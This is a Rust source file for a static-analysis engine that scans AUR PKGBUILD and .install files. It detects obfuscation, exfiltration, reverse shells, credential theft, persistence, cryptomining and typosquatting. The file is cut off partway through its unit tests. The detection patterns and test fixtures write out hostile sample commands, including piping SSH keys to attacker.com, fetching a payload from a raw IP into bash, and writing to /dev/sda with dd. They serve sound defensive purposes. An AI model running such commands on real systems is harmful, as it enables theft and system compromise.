//! Static-analysis heuristics engine for PKGBUILD and .install files.
//!
//! Covers real-world AUR attack vectors observed in recent supply-chain campaigns:
//! - Obfuscation (base64, hex, printf octal, eval, rev, nested substitutions)
//! - Exfiltration (Discord webhooks, Telegram bots, raw IPs, pastebins, DNS, netcat)
//! - Reverse shells (bash /dev/tcp, mkfifo, python one-liners)
//! - Credential theft (SSH keys, GPG, browser profiles, wallets, password managers, cloud tokens)
//! - Persistence (systemd units, crontabs, profile injection, XDG autostart, udev rules)
//! - Packaging tricks (unhashed sources, install scriptlet abuse, dependency hijacking, npm/bun install)
//! - Suspicious commands (SUID bits, dd to block devices, iptables, kernel modules, security service kills)
//! - Cryptojacking (XMRig signatures, mining pools, wallet addresses)
//! - Structural anomalies (long encoded blobs, variable splicing)
//! - Typosquatting (Damerau-Levenshtein against top AUR packages)

use crate::findings::{Behavior, Finding};
use regex::Regex;
use serde::Serialize;
use std::collections::HashSet;
use std::sync::LazyLock;

static VAR_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"^([a-zA-Z_]\w*)=["']([a-zA-Z]{1,4})["']"#).unwrap());

static LONG_B64_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"['"]([A-Za-z0-9+/=]{60,})['"]"#).unwrap());

pub const POPULAR_PACKAGES: &[&str] = &[
    "google-chrome",
    "visual-studio-code-bin",
    "spotify",
    "discord",
    "paru",
    "paru-bin",
    "yay",
    "yay-bin",
    "slack-desktop",
    "zoom",
    "postman-bin",
    "notion-app",
    "brave-bin",
    "1password",
    "bitwarden-bin",
    "anydesk-bin",
    "teamviewer",
    "insomnia",
    "sublime-text-4",
    "sublime-merge",
    "docker-desktop",
    "steam-native",
    "protonup-qt",
    "heroic-games-launcher-bin",
    "obs-studio-tytan652",
    "lutris-git",
    "bottles",
    "dropbox",
    "signal-desktop-beta-bin",
    "telegram-desktop-bin",
    "betterdiscord-installer-bin",
    "vencord-installer-bin",
    "zen-browser-bin",
    "thorium-browser-bin",
    "floorp-bin",
    "librewolf-bin",
    "vesktop-bin",
    "spicetify-cli",
    "hyprland-git",
    "waybar-hyprland",
    "swww",
    "rofi-wayland",
    "wofi",
    "kitty-git",
    "foot-git",
    "alacritty-git",
    "nerd-fonts-complete",
    "ttf-ms-fonts",
    "ttf-jetbrains-mono-nerd",
    "auto-cpufreq",
    "tlp",
    "ananicy-cpp",
    "downgrade",
    "debtap",
    "pamac-aur",
    "bauh",
];

#[derive(Serialize)]
pub struct Rule {
    pub id: &'static str,
    pub severity: &'static str,
    pub pattern: &'static str,
    pub description: &'static str,
    pub behavior: Behavior,
}

pub const RULES: &[Rule] = &[
    // --- Obfuscation ---
    Rule {
        id: "OBFUSCATED_BASE64",
        severity: "CRITICAL",
        pattern: r##"base64\s+(?:-d|--decode)"##,
        description: "base64 decode invocation detected (often hides malicious payload)",
        behavior: Behavior::Obfuscation,
    },
    Rule {
        id: "OBFUSCATED_HEX",
        severity: "CRITICAL",
        pattern: r##"xxd\s+-(?:r|p)"##,
        description: "xxd hex decode detected (reconstructs binary or script payload)",
        behavior: Behavior::Obfuscation,
    },
    Rule {
        id: "OBFUSCATED_PRINTF_OCTAL",
        severity: "CRITICAL",
        pattern: r##"printf\s+['"](?:\\[0-7]{3}){4,}"##,
        description: "printf with octal escapes (encodes shell code as octal bytes)",
        behavior: Behavior::Obfuscation,
    },
    Rule {
        id: "OBFUSCATED_PRINTF_HEX",
        severity: "CRITICAL",
        pattern: r##"printf\s+['"](?:\\x[0-9a-fA-F]{2}){4,}"##,
        description: "printf with hex escapes (encodes shell code as hex bytes)",
        behavior: Behavior::Obfuscation,
    },
    Rule {
        id: "OBFUSCATED_EVAL",
        severity: "CRITICAL",
        pattern: r##"\beval\s+["'$]"##,
        description: "eval with dynamic variable (executes constructed shell string)",
        behavior: Behavior::Obfuscation,
    },
    Rule {
        id: "OBFUSCATED_REV_PIPE",
        severity: "CRITICAL",
        pattern: r##"\brev\b.*\|\s*(?:bash|sh|eval)"##,
        description: "string reversal piped to shell (backwards command obfuscation)",
        behavior: Behavior::Obfuscation,
    },
    Rule {
        id: "OBFUSCATED_DOLLAR_EXEC",
        severity: "HIGH",
        pattern: r##"\$\(\s*(?:echo|printf|cat)\s+.*(?:\|[^|\n].*){2,}\)"##,
        description: "deeply nested substitution with pipe chain (obfuscated execution)",
        behavior: Behavior::Obfuscation,
    },
    // --- Exfiltration ---
    Rule {
        id: "EXFIL_DISCORD_WEBHOOK",
        severity: "CRITICAL",
        pattern: r##"discord(?:app)?\.com/api/webhooks"##,
        description: "hardcoded Discord webhook URL (primary token/key exfiltration channel)",
        behavior: Behavior::NetworkAccess,
    },
    Rule {
        id: "EXFIL_TELEGRAM_BOT",
        severity: "CRITICAL",
        pattern: r##"api\.telegram\.org/bot"##,
        description: "Telegram bot API endpoint (used as C2 or exfiltration channel)",
        behavior: Behavior::NetworkAccess,
    },
    Rule {
        id: "EXFIL_RAW_IP",
        severity: "HIGH",
        pattern: r##"(?:curl|wget|nc|ncat)\s+[^#\n]*(?:https?://)?(?:[0-9]{1,3}\.){3}[0-9]{1,3}"##,
        description: "network tool targeting raw IP address without domain name",
        behavior: Behavior::NetworkAccess,
    },
    Rule {
        id: "EXFIL_PASTEBIN",
        severity: "HIGH",
        pattern: r##"https?://(?:pastebin\.com/raw|hastebin\.com/raw|ghostbin\.\w+|ix\.io|sprunge\.us|transfer\.sh|0x0\.st|catbox\.moe|temp\.sh|file\.io)"##,
        description: "fetching from ephemeral pastebin/file drop (payload changes dynamically)",
        behavior: Behavior::DynamicDownload,
    },
    Rule {
        id: "EXFIL_CURL_PIPE_EXEC",
        severity: "HIGH",
        pattern: r##"(?:curl|wget)\s+[^|\n]+\|\s*(?:sudo\s+)?(?:bash|sh|python[23]?|perl|ruby|node)"##,
        description: "remote download piped directly into interpreter",
        behavior: Behavior::DynamicDownload,
    },
    Rule {
        id: "EXFIL_DNS_TUNNEL",
        severity: "HIGH",
        pattern: r##"(?:dig|nslookup|host)\s+[^#\n]*\$"##,
        description: "DNS lookup with variable expansion (possible DNS tunneling)",
        behavior: Behavior::NetworkAccess,
    },
    Rule {
        id: "EXFIL_NC_CONNECT",
        severity: "HIGH",
        pattern: r##"\b(?:nc|ncat|socat)\b\s+(?:-[a-zA-Z]*\s+)*[0-9a-zA-Z]"##,
        description: "netcat or socat connection (reverse shell or data socket)",
        behavior: Behavior::NetworkAccess,
    },
    Rule {
        id: "THREAT_INTEL_TUNNEL_PROXY",
        severity: "CRITICAL",
        pattern: r##"(?:ngrok\.io|portmap\.io|localtunnel\.me|serveo\.net|pinggy\.io|pagekite\.me|packetriot\.com|playit\.gg|tunnelmole\.net)"##,
        description: "connection targeting ephemeral reverse-proxy or tunnel service (attacker C2 evasion)",
        behavior: Behavior::NetworkAccess,
    },
    // --- Reverse Shells ---
    Rule {
        id: "REVSHELL_DEV_TCP",
        severity: "CRITICAL",
        pattern: r##"/dev/tcp/"##,
        description: "bash /dev/tcp connection (standard reverse shell vector)",
        behavior: Behavior::NetworkAccess,
    },
    Rule {
        id: "REVSHELL_MKFIFO",
        severity: "CRITICAL",
        pattern: r##"mkfifo\s+/tmp/"##,
        description: "mkfifo in /tmp (named pipe reverse shell setup)",
        behavior: Behavior::NetworkAccess,
    },
    Rule {
        id: "REVSHELL_PYTHON",
        severity: "CRITICAL",
        pattern: r##"python[23]?\s+-c\s+['"].*import\s+(?:socket|subprocess|os)"##,
        description: "python one-liner importing socket/subprocess (reverse shell script)",
        behavior: Behavior::NetworkAccess,
    },
    // --- Credential Theft ---
    Rule {
        id: "CRED_SSH_KEYS",
        severity: "CRITICAL",
        pattern: r##"(?:~/\.ssh|\$HOME/\.ssh|\$\{HOME\}/\.ssh|/home/[^/]+/\.ssh)/(?:id_rsa|id_ed25519|id_ecdsa|authorized_keys|known_hosts|config)"##,
        description: "accessing private SSH keys or credentials",
        behavior: Behavior::CredentialAccess,
    },
    Rule {
        id: "CRED_SSH_DIR",
        severity: "HIGH",
        pattern: r##"(?:cat|cp|tar|zip|curl.*-[dF])\s+[^#\n]*\.ssh"##,
        description: "reading or copying ~/.ssh directory contents",
        behavior: Behavior::CredentialAccess,
    },
    Rule {
        id: "CRED_GPG_DIR",
        severity: "HIGH",
        pattern: r##"(?:~/\.gnupg|\$HOME/\.gnupg)"##,
        description: "accessing GnuPG keyring directory",
        behavior: Behavior::CredentialAccess,
    },
    Rule {
        id: "CRED_BROWSER_PROFILES",
        severity: "CRITICAL",
        pattern: r##"(?:\.mozilla/firefox|\.config/(?:google-chrome|chromium|BraveSoftware)|\.librewolf|\.config/vivaldi)[^#\n]*(?:logins\.json|Login\s*Data|cookies|Cookies|key[34]\.db|places\.sqlite)"##,
        description: "accessing browser passwords, cookies, or profile databases",
        behavior: Behavior::CredentialAccess,
    },
    Rule {
        id: "CRED_CRYPTO_WALLETS",
        severity: "CRITICAL",
        // Require hidden-dir shape so domains like download.electrum.org don't match.
        pattern: r##"(?m)(?:(?:^|[\s"'=/~])\.(?:bitcoin|ethereum|monero|electrum|solana)(?:[/\s"']|$)|\.config/(?:Exodus|Atomic|Ledger))"##,
        description: "accessing cryptocurrency wallet files",
        behavior: Behavior::CredentialAccess,
    },
    Rule {
        id: "CRED_PASSWORD_MANAGERS",
        severity: "CRITICAL",
        pattern: r##"(?:\.(?:password-store|keepass|config/(?:1Password|bitwarden))|\.local/share/keyrings)"##,
        description: "accessing local password vault or system keyrings",
        behavior: Behavior::CredentialAccess,
    },
    Rule {
        id: "CRED_CLOUD_CREDS",
        severity: "CRITICAL",
        pattern: r##"(?:\.aws/credentials|\.config/gcloud|\.azure/|\.kube/config|\.docker/config\.json)"##,
        description: "accessing AWS, GCP, Azure, or Kubernetes cloud credentials",
        behavior: Behavior::CredentialAccess,
    },
    Rule {
        id: "CRED_ENV_SECRETS",
        severity: "HIGH",
        pattern: r##"(?:cat|grep|sed|awk)\s+[^#\n]*/(?:\.env|\.bashrc|\.bash_profile|\.profile|\.zshrc)"##,
        description: "reading shell profile or .env files for secrets/tokens",
        behavior: Behavior::CredentialAccess,
    },
    Rule {
        id: "CRED_SHADOW_SUDOERS",
        severity: "CRITICAL",
        pattern: r##"(?:cat|cp|curl.*-[dF])\s+[^#\n]*/etc/(?:shadow|sudoers|passwd)"##,
        description: "reading /etc/shadow or /etc/sudoers security files",
        behavior: Behavior::CredentialAccess,
    },
    Rule {
        id: "CRED_SHELL_HISTORY",
        severity: "HIGH",
        pattern: r##"(?:cat|cp|tar|curl)\s+[^#\n]*(?:\.bash_history|\.zsh_history|\.histfile)"##,
        description: "copying or exfiltrating shell history logs",
        behavior: Behavior::CredentialAccess,
    },
    // --- Persistence ---
    Rule {
        id: "PERSIST_SYSTEMD",
        severity: "CRITICAL",
        pattern: r##"(?:cp|install|tee|cat\s*>|mv)\s+[^#\n]*/etc/systemd/system/[a-zA-Z]"##,
        description: "writing custom systemd service file outside standard package tree",
        behavior: Behavior::Persistence,
    },
    Rule {
        id: "PERSIST_CRON",
        severity: "CRITICAL",
        pattern: r##"(?:crontab\s+-|/etc/cron\.\w+/|/var/spool/cron/)"##,
        description: "modifying crontab or cron files for persistent background execution",
        behavior: Behavior::Persistence,
    },
    Rule {
        id: "PERSIST_PROFILE_INJECT",
        severity: "CRITICAL",
        pattern: r##"(?:>>|tee\s+-a)\s+[^#\n]*(?:\.bashrc|\.bash_profile|\.profile|\.zshrc|/etc/profile)"##,
        description: "appending persistent payload into shell startup scripts",
        behavior: Behavior::Persistence,
    },
    Rule {
        id: "PERSIST_XDG_AUTOSTART",
        severity: "HIGH",
        pattern: r##"(?:\.config/autostart|/etc/xdg/autostart)/[a-zA-Z].*\.desktop"##,
        description: "dropping XDG desktop autostart entry",
        behavior: Behavior::Persistence,
    },
    Rule {
        id: "PERSIST_UDEV_RULES",
        severity: "HIGH",
        pattern: r##"/etc/udev/rules\.d/"##,
        description: "creating custom udev rule for event-driven execution",
        behavior: Behavior::Persistence,
    },
    // --- Packaging Abuse ---
    Rule {
        id: "PKG_SKIP_HASH",
        severity: "LOW",
        pattern: r##"(?:sha256sums|sha512sums|b2sums|md5sums)(?:_[a-z0-9_]+)?=\s*\([^)]*['"]SKIP['"]"##,
        description: "integrity verification bypassed ('SKIP') for non-VCS source archive",
        behavior: Behavior::DynamicDownload,
    },
    Rule {
        id: "PKG_REPLACE_CORE",
        severity: "CRITICAL",
        pattern: r##"replaces=\s*\([^)]*['"](?:base|linux|glibc|systemd|coreutils|pacman|sudo|shadow)['"]"##,
        description: "replaces=() targets a core base package (silent system package replacement)",
        behavior: Behavior::PackageInstallation,
    },
    Rule {
        id: "PKG_PROVIDES_CORE",
        severity: "HIGH",
        pattern: r##"provides=\s*\([^)]*['"](?:base|linux|glibc|systemd|coreutils|pacman|sudo|shadow)['"]"##,
        description: "provides=() claims core base package name (dependency hijacking)",
        behavior: Behavior::PackageInstallation,
    },
    Rule {
        id: "PKG_INSTALL_FILE_REF",
        severity: "INFO",
        pattern: r##"install=\s*['"]?[a-zA-Z0-9._-]+\.install"##,
        description: "references external .install scriptlet",
        behavior: Behavior::PackageInstallation,
    },
    Rule {
        id: "PKG_NPM_INSTALL",
        severity: "LOW",
        pattern: r##"\bnpm\s+install\b|\bbun\s+install\b|\byarn\s+install\b"##,
        description: "unlocked npm/bun/yarn install during build (unpinned dependency risk)",
        behavior: Behavior::DynamicDownload,
    },
    // --- Suspicious System Commands ---
    Rule {
        id: "SUS_CHMOD_SUID",
        severity: "CRITICAL",
        pattern: r##"chmod\s+[^#\n]*[ugo]?\+s\b|chmod\s+[^#\n]*4[0-7]{3}\b"##,
        description: "setting SUID permission bit on binary (runs as root)",
        behavior: Behavior::PrivilegeEscalation,
    },
    Rule {
        id: "SUS_DD_WRITE",
        severity: "HIGH",
        pattern: r##"\bdd\b\s+[^#\n]*of=/dev/(?:sd|nvme|hd|vd|xvd|mmcblk|disk|mapper|md|loop)"##,
        description: "raw dd write to disk or block device",
        behavior: Behavior::ArbitraryFilesystemWrite,
    },
    Rule {
        id: "SUS_IPTABLES",
        severity: "HIGH",
        pattern: r##"\b(?:iptables|nftables|nft)\b\s+[^#\n]*(?:-A|-I|add\s+rule)"##,
        description: "modifying firewall rules (opening ports / redirecting traffic)",
        behavior: Behavior::ServiceManipulation,
    },
    Rule {
        id: "SUS_KERNEL_MODULE",
        severity: "CRITICAL",
        pattern: r##"\b(?:insmod|modprobe)\s+[^#\n]*/(?:tmp|home|var)"##,
        description: "loading kernel module from non-standard path",
        behavior: Behavior::PrivilegeEscalation,
    },
    Rule {
        id: "SUS_PROC_MANIP",
        severity: "CRITICAL",
        pattern: r##"(?:mount\s+[^#\n]*-o\s+bind\s+[^#\n]*/proc|/proc/[0-9]+/(?:exe|cmdline|environ))"##,
        description: "tampering with /proc (process hiding or memory inspection)",
        behavior: Behavior::PrivilegeEscalation,
    },
    Rule {
        id: "SUS_KILL_SECURITY",
        severity: "HIGH",
        pattern: r##"(?:systemctl\s+(?:stop|disable|mask)\s+[^#\n]*(?:apparmor|selinux|firewall|fail2ban|clamav))"##,
        description: "disabling security services or firewalls",
        behavior: Behavior::ServiceManipulation,
    },
    Rule {
        id: "SUS_ALIAS_HIJACK",
        severity: "CRITICAL",
        pattern: r##"alias\s+(?:ls|cat|sudo|pacman|yay|paru)="##,
        description: "aliasing core shell commands (environment hijacking)",
        behavior: Behavior::ShellExecution,
    },
    // --- Cryptojacking ---
    Rule {
        id: "MINER_XMRIG",
        severity: "CRITICAL",
        pattern: r##"(?:xmrig|xmr-stak|minerd|cpuminer|stratum\+tcp://|pool\.(?:minexmr|hashvault|nanopool|supportxmr))"##,
        description: "cryptocurrency mining binary or pool URL",
        behavior: Behavior::ShellExecution,
    },
    Rule {
        id: "MINER_WALLET_ADDR",
        severity: "HIGH",
        pattern: r##"4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}"##,
        description: "Monero wallet address detected in script",
        behavior: Behavior::ShellExecution,
    },
];

struct CompiledRule {
    rule: &'static Rule,
    regex: Regex,
}

pub struct PKGBUILDScanner {
    rules: Vec<CompiledRule>,
    popular_set: HashSet<String>,
    popular_cleaned: Vec<(String, String)>,
}

impl PKGBUILDScanner {
    pub fn new() -> Self {
        Self::with_popular_packages(POPULAR_PACKAGES)
    }

    fn with_popular_packages(popular_packages: &[&str]) -> Self {
        let rules = RULES
            .iter()
            .filter_map(|rule| {
                Regex::new(rule.pattern)
                    .ok()
                    .map(|regex| CompiledRule { rule, regex })
            })
            .collect();
        let clean = |s: &str| s.to_lowercase().replace("-bin", "").replace("-git", "");
        Self {
            rules,
            popular_set: popular_packages.iter().map(|&s| s.to_string()).collect(),
            popular_cleaned: popular_packages
                .iter()
                .map(|&p| (p.to_string(), clean(p)))
                .collect(),
        }
    }

    pub fn scan(&self, content: &str, pkgname: Option<&str>) -> Vec<Finding> {
        let mut findings = Vec::new();

        let is_vcs = pkgname.is_some_and(|n| {
            n.ends_with("-git")
                || n.ends_with("-hg")
                || n.ends_with("-svn")
                || n.ends_with("-bzr")
                || n.ends_with("-cvs")
        }) || content.contains("git+")
            || content.contains("git://")
            || content.contains("hg+")
            || content.contains("svn+");

        // 1. Regex pattern scanning
        for (idx, line) in content.lines().enumerate() {
            let trimmed = line.trim();
            if trimmed.starts_with('#') {
                continue;
            }
            for CompiledRule { rule, regex } in &self.rules {
                if is_vcs && rule.id == "PKG_SKIP_HASH" {
                    continue;
                }
                if rule.id == "SUS_CHMOD_SUID" && line.contains("chrome-sandbox") {
                    continue;
                }
                if let Some(m) = regex.find(line) {
                    // Real shell-structure check (additive precision
                    // improvement, see src/shellparse.rs): "base64 -d"
                    // appearing purely inside a string literal (e.g.
                    // `echo "mentions base64 -d"`) is inert text, not an
                    // actual decode invocation — don't flag it. A real
                    // invocation (bare, or inside `$(...)`/backtick command
                    // substitution) still fires normally.
                    if rule.id == "OBFUSCATED_BASE64"
                        && crate::shellparse::is_literal_span(line, m.start(), m.end())
                    {
                        continue;
                    }
                    let matched = m.as_str();
                    let snippet = if matched.len() > 120 {
                        format!("{}...", &matched[..117])
                    } else {
                        matched.to_string()
                    };
                    findings.push(Finding {
                        rule_id: rule.id.to_string(),
                        severity: rule.severity.to_string(),
                        description: rule.description.to_string(),
                        line_number: idx + 1,
                        matched_text: snippet,
                        behavior: rule.behavior,
                    });
                }
            }
        }

        // 2. Structural checks
        findings.extend(self.check_structural(content));

        // 3. Typosquatting
        if let Some(name) = pkgname {
            if !self.popular_set.contains(name) {
                if let Some(target) = self.check_typosquatting(name) {
                    findings.push(Finding {
                        rule_id: "TYPOSQUATTING".to_string(),
                        severity: "MEDIUM".to_string(),
                        description: format!(
                            "Package '{name}' closely resembles high-profile package '{target}'"
                        ),
                        line_number: 1,
                        matched_text: format!("{name} -> {target}"),
                        behavior: Behavior::PackageInstallation,
                    });
                }
            }
        }

        // 4. Shannon Information Entropy analysis
        findings.extend(crate::analyzer::analyze_entropy(content));

        // 5. Recursive Base64 payload de-obfuscation
        findings.extend(crate::analyzer::deobfuscate_and_scan(content, |decoded| {
            self.scan(decoded, None)
        }));

        // 6. Real shell-pipeline-structure detection (fetch-and-execute,
        // base64-decode-and-execute) — see src/shellparse.rs.
        findings.extend(crate::analyzer::analyze_pipeline_structure(content));

        findings
    }

    fn check_structural(&self, content: &str) -> Vec<Finding> {
        let mut findings = Vec::new();

        // Long encoded strings (excluding standard sha256/sha512/b2 hex hashes)
        for (idx, line) in content.lines().enumerate() {
            let trimmed = line.trim();
            if trimmed.starts_with('#')
                || trimmed.starts_with("sha256sums")
                || trimmed.starts_with("sha512sums")
                || trimmed.starts_with("b2sums")
                || trimmed.starts_with("md5sums")
                || trimmed.starts_with("source")
                || trimmed.starts_with("validpgpkeys")
            {
                continue;
            }
            if let Some(caps) = LONG_B64_RE.captures(line) {
                let matched_str = &caps[1];
                // Skip pure 64 or 128-character hex strings (sha256 / sha512 / b2 hashes inside multi-line arrays)
                if (matched_str.len() == 64 || matched_str.len() == 128)
                    && matched_str.chars().all(|c| c.is_ascii_hexdigit())
                {
                    continue;
                }
                findings.push(Finding {
                    rule_id: "SUS_LONG_ENCODED_STRING".to_string(),
                    severity: "HIGH".to_string(),
                    description:
                        "Long base64-like encoded string found (may hide second-stage payload)"
                            .to_string(),
                    line_number: idx + 1,
                    matched_text: format!("{}...", &line.trim()[..line.trim().len().min(80)]),
                    behavior: Behavior::Obfuscation,
                });
            }
        }

        // Variable splicing
        let short_vars: Vec<_> = content
            .lines()
            .filter_map(|l| VAR_RE.captures(l.trim()).map(|c| c[1].to_string()))
            .collect();
        if short_vars.len() >= 3 {
            findings.push(Finding {
                rule_id: "SUS_VARIABLE_SPLICING".to_string(),
                severity: "HIGH".to_string(),
                description: format!(
                    "Multiple short variable definitions ({} found) - possible command splicing obfuscation",
                    short_vars.len()
                ),
                line_number: 1,
                matched_text: format!("Variables: {}", short_vars[..short_vars.len().min(5)].join(", ")),
                behavior: Behavior::Obfuscation,
            });
        }

        findings
    }

    fn check_typosquatting(&self, candidate: &str) -> Option<String> {
        if candidate.len() < 4 {
            return None;
        }
        let clean = |s: &str| s.to_lowercase().replace("-bin", "").replace("-git", "");
        let cand = clean(candidate);

        for (popular, target) in &self.popular_cleaned {
            if &cand == target {
                continue;
            }
            let len_diff = (cand.len() as isize - target.len() as isize).unsigned_abs();
            if len_diff <= 2 {
                let dist = damerau_levenshtein(&cand, target);
                if dist <= 1 || (cand.len() >= 8 && dist <= 2) {
                    return Some(popular.clone());
                }
            }
        }
        None
    }
}

impl Default for PKGBUILDScanner {
    fn default() -> Self {
        Self::new()
    }
}

fn damerau_levenshtein(s1: &str, s2: &str) -> usize {
    let a = s1.as_bytes();
    let b = s2.as_bytes();
    let len_a = a.len();
    let len_b = b.len();

    let stride = len_b + 2;
    let mut flat = [0usize; 66 * 66];
    let d: &mut [usize] = if (len_a + 2) * stride <= flat.len() {
        &mut flat[..(len_a + 2) * stride]
    } else {
        return damerau_levenshtein_heap(a, b);
    };

    let max_dist = len_a + len_b;
    d[0] = max_dist;
    for i in 0..=len_a {
        d[(i + 1) * stride] = max_dist;
        d[(i + 1) * stride + 1] = i;
    }
    for j in 0..=len_b {
        d[j + 1] = max_dist;
        d[stride + j + 1] = j;
    }

    for i in 1..=len_a {
        for j in 1..=len_b {
            let cost = if a[i - 1] == b[j - 1] { 0 } else { 1 };
            let deletion = d[(i + 1) * stride + j] + 1;
            let insertion = d[i * stride + j + 1] + 1;
            let substitution = d[i * stride + j] + cost;
            let mut val = deletion.min(insertion).min(substitution);

            if i > 1 && j > 1 && a[i - 1] == b[j - 2] && a[i - 2] == b[j - 1] {
                let transposition = d[(i - 1) * stride + j - 1] + 1;
                val = val.min(transposition);
            }
            d[(i + 1) * stride + j + 1] = val;
        }
    }
    d[(len_a + 1) * stride + len_b + 1]
}

fn damerau_levenshtein_heap(a: &[u8], b: &[u8]) -> usize {
    let len_a = a.len();
    let len_b = b.len();
    let stride = len_b + 2;
    let mut d = vec![0usize; (len_a + 2) * stride];
    let max_dist = len_a + len_b;

    d[0] = max_dist;
    for i in 0..=len_a {
        d[(i + 1) * stride] = max_dist;
        d[(i + 1) * stride + 1] = i;
    }
    for j in 0..=len_b {
        d[j + 1] = max_dist;
        d[stride + j + 1] = j;
    }

    for i in 1..=len_a {
        for j in 1..=len_b {
            let cost = if a[i - 1] == b[j - 1] { 0 } else { 1 };
            let deletion = d[(i + 1) * stride + j] + 1;
            let insertion = d[i * stride + j + 1] + 1;
            let substitution = d[i * stride + j] + cost;
            let mut val = deletion.min(insertion).min(substitution);

            if i > 1 && j > 1 && a[i - 1] == b[j - 2] && a[i - 2] == b[j - 1] {
                let transposition = d[(i - 1) * stride + j - 1] + 1;
                val = val.min(transposition);
            }
            d[(i + 1) * stride + j + 1] = val;
        }
    }
    d[(len_a + 1) * stride + len_b + 1]
}

#[cfg(test)]
mod tests {
    use super::*;

    fn test_scanner() -> PKGBUILDScanner {
        PKGBUILDScanner::with_popular_packages(&[
            "google-chrome",
            "visual-studio-code-bin",
            "spotify",
            "discord",
            "paru",
        ])
    }

    #[test]
    fn every_rule_pattern_compiles() {
        for rule in RULES {
            assert!(
                Regex::new(rule.pattern).is_ok(),
                "rule {} has an invalid regex and would be silently skipped",
                rule.id
            );
        }
    }

    #[test]
    fn crypto_wallet_rule_ignores_domains_but_catches_wallet_dirs() {
        let s = test_scanner();
        let benign = "source=(\"https://download.electrum.org/4.5.8/Electrum-4.5.8.tar.gz\")\n";
        assert!(
            !s.scan(benign, None)
                .iter()
                .any(|f| f.rule_id == "CRED_CRYPTO_WALLETS")
        );
        let hostile = "tar czf /tmp/w.tgz ~/.electrum/wallets\n";
        assert!(
            s.scan(hostile, None)
                .iter()
                .any(|f| f.rule_id == "CRED_CRYPTO_WALLETS")
        );
    }

    #[test]
    fn dd_write_rule_flags_block_devices_not_dev_null() {
        let s = test_scanner();
        assert!(
            s.scan("dd if=payload.img of=/dev/sda bs=4M\n", None)
                .iter()
                .any(|f| f.rule_id == "SUS_DD_WRITE")
        );
        assert!(
            !s.scan("dd if=/dev/zero of=/dev/null count=1\n", None)
                .iter()
                .any(|f| f.rule_id == "SUS_DD_WRITE")
        );
    }

    #[test]
    fn every_rule_serializes_with_a_behavior() {
        let json = serde_json::to_value(RULES).unwrap();
        let rules = json.as_array().unwrap();
        assert_eq!(rules.len(), RULES.len());
        for rule in rules {
            let behavior = rule["behavior"].as_str().unwrap_or_default();
            assert!(
                serde_json::from_value::<Behavior>(rule["behavior"].clone()).is_ok(),
                "rule {} has invalid behavior {behavior:?}",
                rule["id"]
            );
        }
    }

    #[test]
    fn rule_findings_carry_their_rule_behavior() {
        let s = test_scanner();
        let findings = s.scan(
            "cat ~/.ssh/id_rsa\ncurl https://discord.com/api/webhooks/1/x\ncrontab -\n",
            None,
        );
        let behavior_of = |id: &str| findings.iter().find(|f| f.rule_id == id).unwrap().behavior;
        assert_eq!(behavior_of("CRED_SSH_KEYS"), Behavior::CredentialAccess);
        assert_eq!(
            behavior_of("EXFIL_DISCORD_WEBHOOK"),
            Behavior::NetworkAccess
        );
        assert_eq!(behavior_of("PERSIST_CRON"), Behavior::Persistence);
    }

    #[test]
    fn embedded_popular_packages_list_is_loaded() {
        assert!(POPULAR_PACKAGES.iter().any(|&p| p == "google-chrome"));
        let s = PKGBUILDScanner::new();
        assert!(
            s.scan("pkgname=goolge-chrome\n", Some("goolge-chrome"))
                .iter()
                .any(|f| f.rule_id == "TYPOSQUATTING")
        );
    }

    #[test]
    fn deobfuscator_detects_hidden_discord_webhook() {
        let scanner = PKGBUILDScanner::new();
        // Base64 of: curl https://discord.com/api/webhooks/123/xyz
        let b64 = "Y3VybCBodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMjMveHl6";
        let script = format!("prepare() {{\n  echo \"{b64}\" | base64 -d | sh\n}}\n");

        let findings = scanner.scan(&script, None);
        let hidden = findings
            .iter()
            .find(|f| f.rule_id == "DEOBFUSCATED_EXFIL_DISCORD_WEBHOOK")
            .unwrap_or_else(|| {
                panic!("Expected de-obfuscation to unmask the hidden Discord webhook, got: {findings:?}")
            });
        assert_eq!(hidden.behavior, Behavior::NetworkAccess);
    }

    #[test]
    fn benign_pkgbuild_clean() {
        let s = test_scanner();
        let content = r#"
# Maintainer: Arch User <user@archlinux.org>
pkgname=foot-terminal
pkgver=1.16.2
pkgrel=1
pkgdesc="A fast terminal emulator"
arch=('x86_64')
url="https://codeberg.org/dnkl/foot"
license=('MIT')
source=("https://codeberg.org/dnkl/foot/releases/download/${pkgver}/foot-${pkgver}.tar.gz")
sha256sums=('38865ecdfca86427382218086ee50a12e259e875155f949c81b539b4bfa254ff')

build() {
    arch-meson foot-${pkgver} build
    ninja -C build
}

package() {
    DESTDIR="${pkgdir}" ninja -C build install
}
"#;
        let findings = s.scan(content, Some("foot-terminal"));
        assert!(
            findings.is_empty(),
            "Expected clean scan, got: {findings:?}"
        );
    }

    #[test]
    fn detects_base64_payload() {
        let s = test_scanner();
        let content = "prepare() {\n  echo 'aW1wb3J0IHNvY2tldA==' | base64 -d | bash\n}\n";
        let findings = s.scan(content, None);
        assert!(findings.iter().any(|f| f.rule_id == "OBFUSCATED_BASE64"));
    }

    #[test]
    fn detects_discord_webhook() {
        let s = test_scanner();
        let content = "curl -d 'token' https://discord.com/api/webhooks/123/abc\n";
        let findings = s.scan(content, None);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "EXFIL_DISCORD_WEBHOOK")
        );
    }

    #[test]
    fn detects_ssh_key_theft() {
        let s = test_scanner();
        let content = "cat ~/.ssh/id_rsa | curl -X POST -d @- http://attacker.com\n";
        let findings = s.scan(content, None);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "CRED_SSH_KEYS" || f.rule_id == "CRED_SSH_DIR")
        );
    }

    #[test]
    fn detects_raw_ip_download() {
        let s = test_scanner();
        let content = "curl http://194.26.29.112/payload.sh | bash\n";
        let findings = s.scan(content, None);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "EXFIL_RAW_IP" || f.rule_id == "EXFIL_CURL_PIPE_EXEC")
        );
    }

    #[test]
    fn detects_typosquatting() {
        let s = test_scanner();
        let content = "pkgname=goolge-chrome\npkgver=1.0\n";
        let findings = s.scan(content, Some("goolge-chrome"));
        assert!(findings.iter().any(|f| f.rule_id == "TYPOSQUATTING"));
    }

    #[test]
    fn detects_systemd_persistence() {
        let s = test_scanner();
        let content = "cp backdoor.service /etc/systemd/system/backdoor.service\n";
        let findings = s.scan(content, None);
        assert!(findings.iter().any(|f| f.rule_id == "PERSIST_SYSTEMD"));
    }

    #[test]
